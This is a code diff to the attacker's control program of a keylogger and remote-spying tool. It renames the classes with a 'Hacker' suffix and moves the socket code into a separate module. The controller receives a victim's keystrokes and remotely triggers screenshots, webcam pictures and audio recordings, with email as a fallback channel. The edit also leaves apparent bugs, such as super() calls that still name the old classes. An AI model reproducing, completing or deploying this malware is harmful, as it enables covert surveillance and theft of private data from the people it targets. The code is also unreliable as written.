@@ -1,8 +1,8 @@
-import zmq
 import threading, os, getpass, shutil, sys, platform
 from datetime import datetime
 from utils import write_file
 from GUI import GUIWindow
+from CommunicationModule import CommunicationHacker
 import base64
 import imaplib, email
 import logging
@@ -29,41 +29,17 @@ config = configparser.ConfigParser()
 config.read('config.ini')
 
 
-class Communication:
-	def __init__(self, ip_address, port_stream, port_interact):
-		self.ip_address = ip_address
-		self.port_stream = port_stream
-		self.port_interact = port_interact
-
-
-	def connect2stream(self):
-		self.stream_context = zmq.Context()
-		self.socket_stream = self.stream_context.socket(zmq.SUB)
-		self.socket_stream.bind('tcp://' + self.ip_address + ':' + str(self.port_stream))
-		self.socket_stream.subscribe('')
-
-		msg = self.socket_stream.recv_string()
-		if base64.b64decode(msg).decode() != 'OK':
-			raise Exception('Connection failed!')
-
-
-	def connect2interaction(self):
-		self.interact_context = zmq.Context()
-		self.socket_interact = self.interact_context.socket(zmq.REQ)
-		self.socket_interact.bind('tcp://' + self.ip_address + ':' + str(self.port_interact))
-
-
-class KeyLogger(threading.Thread):	#zeromq
+class KeyLoggerHacker(threading.Thread):
 	def __init__(self, connection, gui, email_address, email_password):
 		super(KeyLogger, self).__init__()
 
 		self.email_address = email_address
 		self.email_password = email_password
 		self.imap_alias = config['GMAIL_SERVICE']['IMAP']
-		if isinstance(connection, Communication):
+		if isinstance(connection, CommunicationHacker):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
+			raise TypeError("\'connection\' parameter should be \'CommunicationHacker\' type!")
 		if isinstance(gui, GUIWindow):
 			self.gui = gui
 		else:
@@ -137,7 +113,6 @@ class KeyLogger(threading.Thread):	#zeromq
 					break
 
 			except:
-				stop_threads = True
 				self.connection.socket_stream.close()
 				self.connection.socket_interact.close()
 				logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
@@ -185,13 +160,13 @@ class KeyLogger(threading.Thread):	#zeromq
 				break
 
 
-class MenuHandler(threading.Thread):
+class MenuHandlerHacker(threading.Thread):
 	def __init__(self, connection):
 		super(MenuHandler, self).__init__()
-		if isinstance(connection, Communication):
+		if isinstance(connection, CommunicationHacker):
 			self.connection = connection
 		else:
-			raise TypeError("\'connection\' parameter should be \'Communication\' type!")
+			raise TypeError("\'connection\' parameter should be \'CommunicationHacker\' type!")
 
 
 	def run(self):
@@ -208,28 +183,30 @@ class MenuHandler(threading.Thread):
 			elif option == '1':
 				logger.info('Taking screenshot...')
 				try:
-					option = base64.b64encode(option.encode())
+					option = base64.b64encode(option.encode()).decode()
 					self.connection.socket_interact.send_string(option)
+					option = base64.b64decode(option).decode()
 				except:
 					break
 			elif option == '2':
 				logger.info('Taking webcam picture...')
 				try:
-					option = base64.b64encode(option.encode())
+					option = base64.b64encode(option.encode()).decode()
 					self.connection.socket_interact.send_string(option)
+					option = base64.b64decode(option).decode()
 				except:
 					break
 			elif option == '3':
 				logger.info('Recording audio...')
 				try:
-					option = base64.b64encode(option.encode())
+					option = base64.b64encode(option.encode()).decode()
 					self.connection.socket_interact.send_string(option)
+					option = base64.b64decode(option).decode()
 				except:
 					break
 			elif option == '4' or stop_threads:
-				stop_threads = True
 				logger.info("Closing the connection...")
-				option = base64.b64encode(option.encode())
+				option = base64.b64encode(option.encode()).decode()
 				self.connection.socket_interact.send_string(option)
 				break
 			elif option == '':
@@ -237,7 +214,7 @@ class MenuHandler(threading.Thread):
 			else:
 				print("Wrong option!\n")
 
-			# resposes
+			# replies
 			if option in ['1', '2', '3']:
 				data = self.connection.socket_interact.recv_string()
 				data = base64.b64decode(data).decode()
@@ -250,7 +227,6 @@ class MenuHandler(threading.Thread):
 						with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
 							handler.write(data[2])
 						logger.info('Done')
-					prompt = True
 				elif data[0] == "wcpic":
 					if data[2] == 'Error':
 						logger.info("Error while taking webcam picture!")
@@ -258,7 +234,6 @@ class MenuHandler(threading.Thread):
 						with open(f'./webcam_{data[1]}.png', 'wb') as handler:
 							handler.write(data[2])
 						logger.info('Done')
-					prompt = True
 				elif data[0] == 'audio':
 					if data[2] == 'Error':
 						logger.info("Error while recording audio!")
@@ -271,35 +246,35 @@ class MenuHandler(threading.Thread):
 def main():
 	global gui_running, stop_threads
 
-	communication = Communication(ip_address=config['COMMUNICATION']['ipPlaceholder'], \
-		port_stream=config['COMMUNICATION']['portStream'], \
+	communication = CommunicationHacker(ip_address=config['COMMUNICATION']['ipPlaceholder'],
+		port_stream=config['COMMUNICATION']['portStream'],
 		port_interact=config['COMMUNICATION']['portInteract'])
 
 	try:
 		logger.info('Waiting for connection...')
 		communication.connect2stream()
 		communication.connect2interaction()
-	except socket.error:
-		print(socket.error)
-		sys.exit(1)
+	except Exception as err:
+		logger.debug(err)
+		sys.exit(2)
 	logger.info('Client connected!')
 
 	gui = GUIWindow("KeyStrokeLogger")
 
 	try:
-		key_logger = KeyLogger(connection=communication, gui=gui, \
-			email_address=config['GMAIL_SERVICE']['EmailAddress'], \
+		key_logger = KeyLoggerHacker(connection=communication, gui=gui,
+			email_address=config['GMAIL_SERVICE']['EmailAddress'],
 			email_password=config['GMAIL_SERVICE']['EmailPassword'])
 		key_logger.start()
 
-		menu = MenuHandler(connection=communication)
+		menu = MenuHandlerHacker(connection=communication)
 		menu.start()
 	except TypeError as err:
-		print(err)
-		sys.exit(1)
+		logger.debug(err)
+		sys.exit(3)
 	except Exception as err:
 		logger.debug(err)
-		sys.exit(1)
+		sys.exit(4)
 
 	gui_running = True
 	try:
